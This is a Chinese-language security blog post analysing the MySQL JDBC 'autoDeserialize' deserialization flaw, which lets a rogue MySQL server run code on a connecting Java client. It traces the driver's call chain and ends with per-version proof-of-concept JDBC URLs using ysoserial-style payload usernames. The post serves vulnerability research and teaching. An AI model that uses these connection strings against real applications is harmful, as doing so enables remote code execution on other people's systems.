# Java JDBC Attack-MySQL

  
  
&lt;!--more--&gt;  
## 0x01 **原理概述**  
扩展参数就是本次导致安全漏洞的一个重要的部分  
MySQL JDBC包含了一个危险的扩展参数:`autoDeserialize`。这个参数配置为 true 时，JDBC客户端将会自动反序列化服务端返回的数据，这就产生了RCE  
此时如果攻击者作为 MYSQL 服务器的角色，给客户端返回了恶意的序列化数据，客户端就会自动反序列化触发恶意代码，造成漏洞。  
主要会用到如下两类参数  
- 自动检测与反序列化存在BLOB字段中的对象。 **autoDeserialize**  
- 触发反序列化  
    - queryInterceptors，一个逗号分割的Class列表（实现了`com.mysql.cj.interceptors.QueryInterceptor`接口的Class），在Query&#34;之间&#34;进行执行来影响结果。  
    - detectCustomCollations  
通过`ServerStatusDiffInterceptor`或`detectCustomCollations`触发查询语句`SHOW SESSION STATUS`、`SHOW COLLATION`等，并调用`resultSetToMap`处理数据库返回的结果，而当`autoDeserialize`为true时会对server中返回的结果进行反序列化，从而造成代码执行  
## 0x02 漏洞分析  
`pom.xml`  
```xml  
&lt;dependency&gt;    
    &lt;groupId&gt;mysql&lt;/groupId&gt;    
    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;    
    &lt;version&gt;8.0.13&lt;/version&gt;    
&lt;/dependency&gt;  
```  
Demo  
```java  
import java.sql.Connection;    
import java.sql.DriverManager;    
    
public class JDBC_Mysql {    
    public static void main(String[] args) throws Exception{    
        String driver = &#34;com.mysql.jdbc.Driver&#34;;    
        String DB_URL = &#34;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc&#34;;//8.x使用    
        Class.forName(driver);    
        Connection conn = DriverManager.getConnection(DB_URL);    
    }    
}  
```  
  
```  
queryInterceptors，一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query&#34;之间&#34;进行执行来影响结果。  
```  
所以如上所述，想要触发`queryInterceptors`则需要触发`SQL Query`，而在`getConnection`过程中，会触发`SET NAMES utf`、`SET autocommit=-1`一类的请求，所以会触发我们所配置的`queryInterceptors`。  
`ServerStatusDiffInterceptor`的`preProcess`方法（执行 SQL query前需要执行的方法），调用了`populateMapWithSessionStatusValues`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501162142671.png)
跟进查看`populateMapWithSessionStatusValues()`方法，执行了`SHOW SESSION STATUS`并获取了返回结果，进入到了`resultSetToMap()`方法，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501162142836.png)
继续跟进，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501162144369.png)
这里直接进入了`com.mysql.cj.jdbc.result.ResultSetImpl#getObject`方法，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501162147273.png)
当1 或2字段为 Blob 且存储了序列化的数据，即可触发`readObject()`方法  
这里还需要注意需要满足此条件  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501162148585.png)
## 0x03 **POC**  
各版本均有差异  
**ServerStatusDiffInterceptor 触发**  
8.x   
```  
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc  
```  
6.x(属性名不同)  
```  
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc  
```  
5.1.11及以上的5.x版本(包名没有cj)  
```  
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc  
```  
5.1.10及以下的5.1.X版本：同上，但是需要连接后执行查询。  
**detectCustomCollations触发**  
5.1.29-5.1.40  
```  
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc  
```  
5.1.28-5.1.19  
```  
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc  
```  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/java-jdbc-attack-mysql/  

